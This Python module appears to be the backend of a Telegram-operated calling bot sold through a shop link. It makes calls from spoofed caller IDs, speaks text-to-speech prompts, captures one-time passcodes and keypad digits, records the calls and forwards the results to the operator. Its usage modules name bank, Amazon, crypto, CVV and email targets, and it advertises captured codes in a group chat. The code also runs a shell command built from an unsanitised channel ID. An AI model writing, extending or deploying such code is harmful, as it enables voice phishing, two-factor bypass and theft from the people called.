from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timezone
from sox import Transformer
import shutil
import httpx
import json
import time
import uuid
import os
import aiofiles
import subprocess
import asyncio

# OTHER
import azure.cognitiveservices.speech as speechsdk

# ENV
from dotenv import load_dotenv
load_dotenv()

# TG
token = os.getenv('BOT_TOKEN')
chat_group = os.getenv('CHAT_GROUP_ID')
shop_link = os.getenv('SHOP_LINK')
admins_str = os.getenv('ADMINS')
admins = [int(admin_id.strip()) for admin_id in admins_str.split(',')]

# ARI
ari_username = os.getenv('ARI_USERNAME')
ari_password = os.getenv('ARI_PASSWORD')
ws_url = os.getenv('WS_URL')

# DB
mongo_url = os.getenv('MONGO_URL')
db_name = os.getenv('DB_NAME')

# AZURE
subscription_key = os.getenv('SUBSCRIPTION_KEY')
region = os.getenv('AZURE_REGION')
voice_name = os.getenv('VOICE_NAME')

async def make_request_with_retries(client_method, url, **kwargs):
    retries = 2
    async with httpx.AsyncClient() as client:
        while retries >= 0:
            try:
                response = await getattr(client, client_method)(url, **kwargs)
                response.raise_for_status()
                return response.json()
            except httpx.HTTPError:
                retries -= 1
                if retries >= 0:
                    await asyncio.sleep(1)  # Add a 1-second delay before the next retry
                else:
                    raise Exception(f"Failed to {client_method} request after multiple retries.")

# TELEGRAM
async def send_telegram_message(chatid, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text={message}"
    return await make_request_with_retries("get", url)

async def send_telegram_audio(chatid, audio_content, title: str = "transcript.mp3"):
    url = f"https://api.telegram.org/bot{token}/sendAudio"

    payload = {
        'chat_id': chatid,
        'title': title,
        'parse_mode': 'HTML'
    }

    files = {
        'audio': ('audio.mp3', audio_content, 'audio/mpeg'),
    }

    return await make_request_with_retries("post", url, data=payload, files=files)

async def send_accept_deny(chatid, payload_string, call_variables, otpdigits, message, channel_id):
    # Save Info in DB
    await save_calldetails(channel_id=channel_id, chat_id=chatid, payload_string=payload_string, call_variables=call_variables, otpdigits=otpdigits)
    
    keyboard = [
        [
            {"text": "Accept", "callback_data": f"a*{channel_id}"},
            {"text": "Deny", "callback_data": f"d*{channel_id}"}
        ]
    ]
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    params = {
        "chat_id": chatid,
        "text": message,
        "reply_markup": json.dumps({"inline_keyboard": keyboard})
    }

    return await make_request_with_retries("post", url, data=params)
    
async def send_end_call(channel_id, chat_id):
    keyboard = [
        [
            {"text": "✨ Thank You", "callback_data": "thankyou"},
            {"text": "🔄 Restart Call", "callback_data": f"r*{channel_id}"}
        ]
    ]

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": "📞 Call has been terminated.",
        "reply_markup": json.dumps({"inline_keyboard": keyboard})
    }

    return await make_request_with_retries("post", url, data=params)

async def send_call_answered(chat_id):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": "🥑 Call has been answered.",
    }
    return await make_request_with_retries("post", url, data=params)

async def handle_initiated_call(channel_id: str, chat_id: str, number: str, spoof: str):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    keyboard = [
        [{"text": "Hangup", "callback_data": f"h*{channel_id}"}]
    ]
    params = {
        "chat_id": chat_id,
        "text": f"📶 Call has started. {spoof} to {number}",
        "reply_markup": json.dumps({"inline_keyboard": keyboard})
    }
    response = await make_request_with_retries("post", url, data=params)
    print("INITIATED CALL RESPONSE")
    print(response)
    return response

async def send_detection(data, chat_id):
    result = data['data']["payload"]["result"]
    if result == "not_sure":
        return
    notification_text = {
        "machine": "├ 📼 Voicemail Detected",
        "silence": "├ 🔇 Silence detected",
        "human_residence": "├ 👤 Human detected",
        "human_business": "├ 👤 Human detected",
        "fax_detected": "├📼 Fax Detected",
    }.get(result, "├ ❗ Unrecognized result")
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": notification_text
    }
    return await make_request_with_retries("post", url, data=params)
           
async def send_code_vouch(otpcode, chat_id):
    
    if chat_id in admins:
        return
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    params = {
        "chat_id": chat_group,
        "text": f"✅ OTP Code: {otpcode} | <a href='{shop_link}'>Try now</a>",
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    return await make_request_with_retries("post", url, data=params)

            
            
# TEXT - TO - SPEECH (AZURE)
def text_to_speech(text: str, max_retries=3) -> dict:

    # Check folder exists
    sub_folder = "/var/lib/asterisk/sounds/en/audio_files"
    if not os.path.exists(sub_folder):
        os.makedirs(sub_folder)
    
    # Generate audio name
    output_filename_wav = os.path.join(sub_folder, f"output_{uuid.uuid4()}.wav")
    
    print(subscription_key)
    print(region)
    print(voice_name)
    
    # Set up Azure Speech SDK
    speech_config = speechsdk.SpeechConfig(subscription=subscription_key, region=region)
    speech_config.speech_synthesis_voice_name = voice_name
    audio_output = speechsdk.audio.AudioOutputConfig(filename=output_filename_wav)
    speech_synthesizer = speechsdk.SpeechSynthesizer(speech_config=speech_config, audio_config=audio_output)

    # Retry System
    retries = 0
    delay = 1
    while retries < max_retries:
        try:
            # Convert text to speech
            result = speech_synthesizer.speak_text_async(text).get()
            
            if result.reason == speechsdk.ResultReason.SynthesizingAudioCompleted:
                break
            elif result.reason == speechsdk.ResultReason.Canceled:
                cancellation_details = result.cancellation_details
                raise Exception(f"Speech synthesis canceled: {cancellation_details.reason}. Error details: {cancellation_details.error_details}")

        except Exception as e:
            retries += 1
            if retries < max_retries:
                time.sleep(delay)
                delay *= 2  # double the delay for next retry
            else:
                print(f"Error: {e}. Maximum retries reached.")
                return {"success": False, "path": None, "error": str(e)}

    # Convert Audio using sox
    try:
        transformer = Transformer()
        transformer.rate(8000)
        transformer.channels(1)
        transformer.convert(bitdepth=16)

        # Temp File
        temp_output_filename = f"{output_filename_wav}.temp.wav"
        transformer.build(output_filename_wav, temp_output_filename)

        # Replace File
        shutil.move(temp_output_filename, output_filename_wav)
        
    except Exception as e:
        print(f"Error while transforming audio: {e}")
        return {"success": False, "path": None, "error": str(e)}
    
    response = {"success": True, "path": os.path.splitext(os.path.basename(output_filename_wav))[0], "error": None}
    return response



# ARI - CALL CONTROL
async def hangup_call(channel_id: str) -> dict:
    url = f"http://localhost:8088/ari/channels/{channel_id}"
    auth = httpx.BasicAuth(ari_username, ari_password)
    
    async with httpx.AsyncClient() as session:
        try:
            response = await session.delete(url, auth=auth)
            if response.status_code == 204:
                return {"status": "success", "message": "Call was successfully hung up."}
            else:
                response_data = response.json()
                return {"status": "error", "message": response_data.get("message", "Unknown error")}
        except Exception as e:
            print(e)

# ARI - PLAYING AUDIO
async def play_audio_over_channel(channel_id: str, file_path: str) -> str:
    url = f"http://localhost:8088/ari/channels/{channel_id}/play"
    params = {"media": f"sound:/var/lib/asterisk/sounds/en/audio_files/{file_path}"}
    auth = httpx.BasicAuth(ari_username, ari_password)
    
    playback_id = None

    try:
        async with httpx.AsyncClient() as session:
            response = await session.post(url, params=params, auth=auth)
            print(f"Response: {response.status_code} - {response.text}")
            if response.status_code == 200 or response.status_code == 204:
                response_data = response.json()
                playback_id = response_data.get("id", None)
    except Exception as e:
        print(f"Error while trying to play audio: {e}")
    return playback_id

async def stop_playback(playback_id: str) -> None:
    if not playback_id:
        print("No valid playback ID provided.")
        return

    url = f"http://localhost:8088/ari/playbacks/{playback_id}"
    auth = httpx.BasicAuth(ari_username, ari_password)

    try:
        async with httpx.AsyncClient() as client:
            response = await client.delete(url, auth=auth)
        
            if response.status_code == 204:
                print("Playback stopped successfully")
            else:
                print(f"Failed to stop playback. Response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Error while trying to stop playback: {e}")

async def play_audio_direct(channel_id: str, payload: str, chat_id: str) -> None:
    response = text_to_speech(payload)
    if response["success"]:
        file_path = response["path"]
        
        # Fetch call details
        call_details = await fetch_calldetails(channel_id=channel_id)
        
        # STOP CURRENT AUDIO, only if the playback ID is valid
        if call_details and call_details.get('current_playback_id'):
            print("STOPPING CURRENT PLAYBACK")
            await stop_playback(call_details['current_playback_id'])
        
        # PLAY NEW AUDIO
        current_playback_id = await play_audio_over_channel(channel_id, file_path)
        await save_calldetails(channel_id=channel_id, current_playback_id=current_playback_id)


# ARI - CALL RECORDING
async def start_recording(channel_id: str) -> dict:
    command = f"asterisk -rx 'mixmonitor start {channel_id} /var/spool/asterisk/recordings/{channel_id}.wav'"
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error starting MixMonitor: {e}")

async def send_call_recording(chat_id: str, channel_id: str) -> None:
    try:
        recording_path = f"/var/spool/asterisk/recordings/{channel_id}.wav"
        
        # Check if the file exists and is a valid audio file
        if not os.path.exists(recording_path) or not recording_path.endswith('.wav'):
            print(f"Invalid recording path: {recording_path}")
            return

        # Asynchronously read the file
        async with aiofiles.open(recording_path, mode='rb') as f:
            audio_content = await f.read()
        
        await send_telegram_audio(chat_id, audio_content)

    except Exception as e:
        print(f"Error reading and sending recording: {e}")





# Connect DB
client = AsyncIOMotorClient(
    mongo_url,
    maxPoolSize=50,
    minPoolSize=10
)

# Select DB
db = client[db_name]

async def init_db():
    collections = await db.list_collection_names()
    
    if 'users' not in collections:
        await db.create_collection('users')
        print("Users collection created.")
    else:
        print("Users collection already exists.")
        
    if 'keys' not in collections:
        await db.create_collection('keys')
        print("Keys collection created.")
        
    if 'custom_strings' not in collections:
        await db.create_collection('custom_strings')
        print("Custom Strings collection created.")
    else:
        print("Keys collection already exists.")
        custom_string_collection = db['custom_strings']
        await custom_string_collection.delete_many({})
    
    if 'usages' not in collections:
        await db.create_collection('usages')

users_collection = db['users']
keys_collection = db['keys']
custom_string_collection = db['custom_strings']
usages_collection = db['usages']
sip_trunks_collection = db['sip_trunks']

# CALL DETAILS
# Save Call Details
async def save_calldetails(channel_id=None, chat_id=None, payload_string=None, otpdigits=None, call_details=None, call_variables=None, dtmf_status=None, dtmf_digits=None, current_playback_id=None, is_dial_ran=None):
    unique_id = float(channel_id)
        
    # Info you can save
    details = {
        "_id": unique_id,
        "chat_id": chat_id,
        "payload_string": payload_string,
        "otpdigits": otpdigits,
        "call_details": call_details,
        "call_variables": call_variables,
        "dtmf_status": dtmf_status,
        "dtmf_digits": dtmf_digits,
        "current_playback_id": current_playback_id,
        "is_dial_ran": is_dial_ran
    }

    try:
        existing_record = await custom_string_collection.find_one({"_id": unique_id})

        if existing_record:
            updated_record = existing_record.copy()
            for k, v in details.items():
                if v is not None: 
                    updated_record[k] = v
            await custom_string_collection.replace_one({"_id": unique_id}, updated_record)
        else:
            # Insert the new record
            await custom_string_collection.insert_one(details)
        
        return unique_id

    except Exception as e:
        print("Error while inserting/updating MongoDB:", e)

# Fetch Call Details
async def fetch_calldetails(channel_id=None, chat_id=None):
    details_document = None
    
    if chat_id:
        details_document = await custom_string_collection.find_one({"chat_id": int(chat_id)})
    elif channel_id:
        details_document = await custom_string_collection.find_one({"_id": float(channel_id)})
    
    if not details_document:
        return None

    return details_document

# Delete Call Details
async def delete_calldetails(chat_id):
    result = await custom_string_collection.delete_one({"_id": chat_id})
    
    return result.deleted_count > 0


# Ban SIP Trunk
async def ban_sip_trunk(trunk_number):
    """Set the status of a SIP trunk to 'banned'."""
    result = await sip_trunks_collection.update_one(
        {"_id": trunk_number},
        {"$set": {"status": "banned"}}
    )
    return result.matched_count > 0

# Fetch User Script
async def fetch_user_script(telegram_user_id, script_name):
    print(f"Fetching document for telegram_user_id: {telegram_user_id} of type {type(telegram_user_id)}, script_name: {script_name}")
    
    try:
        telegram_user_id = int(telegram_user_id)
    except ValueError:
        print("Failed to convert telegram_user_id to int.")
        return None

    user_document = await users_collection.find_one({"_id": telegram_user_id})
    
    if user_document is None:
        return None

    custom_scripts = user_document.get("custom_scripts", [])
    
    if not custom_scripts:
        return None

    for script in custom_scripts:
        if script['script_name'] == script_name:
            return script

    return None

# Add usage
async def add_usage(telegram_user_id, username, module, data):
    valid_modules = ['amazon', 'bank', 'crypto', 'custom', 'cvv', 'email', 'live', 'voice']
    
    if module not in valid_modules:
        raise ValueError(f"Invalid module: {module}. Must be one of {', '.join(valid_modules)}.")

    number_called = data.get('channel', {}).get('dialplan', {}).get('exten', None)
    start_time_str = data['channel']['creationtime']
    end_time_str = data['timestamp']

    # Convert to datetime
    start_time = datetime.strptime(start_time_str, '%Y-%m-%dT%H:%M:%S.%f+0000').replace(tzinfo=timezone.utc)
    end_time = datetime.strptime(end_time_str, '%Y-%m-%dT%H:%M:%S.%f+0000').replace(tzinfo=timezone.utc)

    # Convert UTC
    start_time_utc = start_time.astimezone(timezone.utc)
    end_time_utc = end_time.astimezone(timezone.utc)

    # Get Duration
    duration = (end_time_utc - start_time_utc).total_seconds()


    usage_data = {
        "userid": telegram_user_id,
        "username": username,
        "module": module,
        "duration": duration,
        "number_called": number_called,
        "start_time": start_time_utc,
        "end_time": end_time_utc
    }

    result = await usages_collection.insert_one(usage_data)
    return result.inserted_id


